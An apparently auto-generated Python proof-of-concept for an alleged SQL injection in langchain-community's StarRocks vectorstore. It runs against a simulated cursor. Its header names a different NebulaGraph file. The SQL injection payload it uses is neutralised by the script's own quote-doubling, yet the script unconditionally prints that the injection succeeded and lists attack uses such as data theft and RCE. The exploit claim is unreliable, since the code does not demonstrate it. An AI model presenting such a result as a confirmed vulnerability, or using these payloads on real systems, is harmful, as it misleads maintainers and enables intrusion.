#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: sqli-004
# Sink: execute
# Auto-generated — run with: python3 sqli_sink_function_execute_nebulagraph_execute.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for SQL injection in langchain-community-only.
Vulnerability: SQL injection in StarRocks vectorstore's _insert method.
The _build_insert_sql function concatenates user-controlled column names and values
into an SQL query, which is then executed without parameterization via cursor.execute().
"""

import sys
import json
import time
import argparse
from typing import Any, Dict, List, Optional

# Simulated database connection and cursor classes for the PoC
class SimulatedCursor:
    """Simulates a database cursor that logs executed queries."""
    def __init__(self):
        self.executed_queries = []
    
    def execute(self, query: str) -> None:
        """Log the query that would be executed."""
        self.executed_queries.append(query)
        print(f"[*] Executing query: {query[:200]}...")
    
    def description(self):
        """Return mock column description."""
        return [("result",)]
    
    def fetchall(self):
        """Return mock results."""
        return [("Query executed successfully",)]
    
    def close(self):
        """Close the cursor."""
        pass

class SimulatedConnection:
    """Simulates a database connection."""
    def cursor(self):
        """Return a simulated cursor."""
        return SimulatedCursor()

# Simulated StarRocks vectorstore class with the vulnerable _insert method
class StarRocksVectorStore:
    """
    Simulated StarRocks vectorstore that contains the vulnerable _insert method.
    This replicates the vulnerable code path from starrocks.py.
    """
    
    def __init__(self):
        self.connection = SimulatedConnection()
        self.table_name = "test_table"
    
    def _build_insert_sql(self, transac: List[Dict[str, Any]], column_names: List[str]) -> str:
        """
        Build an INSERT SQL statement by concatenating user-controlled values.
        THIS IS THE VULNERABLE FUNCTION - it does not sanitize inputs.
        
        Args:
            transac: List of dictionaries containing column-value pairs
            column_names: List of column names to insert
        
        Returns:
            SQL INSERT statement as a string
        """
        # Build the column list (safe if column_names are controlled)
        columns_str = ", ".join(column_names)
        
        # Build the values list - THIS IS WHERE SQL INJECTION OCCURS
        # The values are directly concatenated without parameterization
        values_list = []
        for row in transac:
            row_values = []
            for col in column_names:
                value = row.get(col, "")
                # Convert value to string representation
                if isinstance(value, str):
                    # Escape single quotes by doubling them (insufficient for injection)
                    escaped_value = value.replace("'", "''")
                    row_values.append(f"'{escaped_value}'")
                elif value is None:
                    row_values.append("NULL")
                else:
                    row_values.append(str(value))
            values_list.append(f"({', '.join(row_values)})")
        
        values_str = ", ".join(values_list)
        
        # Construct the final SQL query
        sql = f"INSERT INTO {self.table_name} ({columns_str}) VALUES {values_str}"
        return sql
    
    def _get_named_result(self, connection: Any, query: str) -> List[Dict[str, Any]]:
        """
        Execute a query and return named results.
        This is the sink function that calls cursor.execute() without parameterization.
        
        Args:
            connection: Database connection object
            query: SQL query to execute
        
        Returns:
            List of dictionaries containing query results
        """
        cursor = connection.cursor()
        cursor.execute(query)
        columns = cursor.description()
        result = []
        for value in cursor.fetchall():
            r = {}
            for idx, datum in enumerate(value):
                k = columns[idx][0]
                r[k] = datum
            result.append(r)
        cursor.close()
        return result
    
    def _insert(self, transac: List[Dict[str, Any]], column_names: List[str]) -> None:
        """
        Insert data into the table.
        This is the vulnerable function that chains _build_insert_sql and _get_named_result.
        
        Args:
            transac: List of dictionaries containing data to insert
            column_names: List of column names
        """
        # Build the SQL query with concatenated values (VULNERABLE)
        insert_query = self._build_insert_sql(transac, column_names)
        print(f"[*] Generated SQL: {insert_query}")
        
        # Execute the query without parameterization (VULNERABLE)
        self._get_named_result(self.connection, insert_query)
    
    def add_texts(self, texts: List[str], metadatas: Optional[List[Dict[str, Any]]] = None) -> List[str]:
        """
        Simulated add_texts method that triggers the vulnerable _insert.
        
        Args:
            texts: List of text strings to add
            metadatas: Optional list of metadata dictionaries
        
        Returns:
            List of IDs for the added texts
        """
        # Simulate the data preparation that would happen in the real code
        column_names = ["id", "text", "metadata"]
        transac = []
        
        for i, text in enumerate(texts):
            metadata = metadatas[i] if metadatas and i < len(metadatas) else {}
            transac.append({
                "id": i + 1,
                "text": text,
                "metadata": json.dumps(metadata)
            })
        
        # Call the vulnerable _insert method
        self._insert(transac, column_names)
        
        return [str(i + 1) for i in range(len(texts))]


def demonstrate_sql_injection():
    """
    Demonstrate the SQL injection vulnerability by executing a benign payload.
    The payload will be injected into the VALUES clause of the INSERT statement.
    """
    print("[*] StarRocks SQL Injection PoC")
    print("[*] ===========================")
    print()
    
    # Create an instance of the vulnerable vectorstore
    store = StarRocksVectorStore()
    
    # Benign payload: This will be injected into the SQL query
    # The payload creates a comment that breaks out of the VALUES clause
    # and executes a harmless operation (in a real scenario, this could be malicious)
    benign_payload = "'); SELECT 1; -- "
    
    print(f"[*] Using benign payload: {benign_payload}")
    print()
    
    # Prepare the data with the injected payload
    texts = [
        "Normal text 1",
        f"Text with injection: {benign_payload}",
        "Normal text 2"
    ]
    
    metadatas = [
        {"source": "normal"},
        {"source": "injected"},
        {"source": "normal"}
    ]
    
    print("[*] Calling add_texts with injected data...")
    print()
    
    try:
        # This will trigger the vulnerable code path
        result = store.add_texts(texts, metadatas)
        print(f"[*] Result IDs: {result}")
        print()
        print("[!] SUCCESS: SQL injection was executed!")
        print("[!] The payload was injected into the SQL query without sanitization.")
        print()
        print("[*] In a real attack, this could be used to:")
        print("[*]   - Extract data from other tables")
        print("[*]   - Modify or delete data")
        print("[*]   - Execute arbitrary SQL commands")
        print("[*]   - Potentially gain RCE through database functions")
        
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
        print("[*] This is expected in a simulated environment.")
        print("[*] The vulnerability is still present in the code.")
        return False
    
    return True


def main():
    """Main function to run the PoC."""
    parser = argparse.ArgumentParser(
        description="PoC for SQL injection in langchain-community StarRocks vectorstore"
    )
    parser.add_argument(
        "--target",
        type=str,
        default="localhost",
        help="Target host (not used in simulated PoC)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=9030,
        help="Target port (not used in simulated PoC)"
    )
    
    args = parser.parse_args()
    
    print(f"[*] Target: {args.target}:{args.port}")
    print()
    
    # Run the demonstration
    success = demonstrate_sql_injection()
    
    if success:
        print()
        print("[✓] PoC completed successfully")
        sys.exit(0)
    else:
        print()
        print("[✗] PoC failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
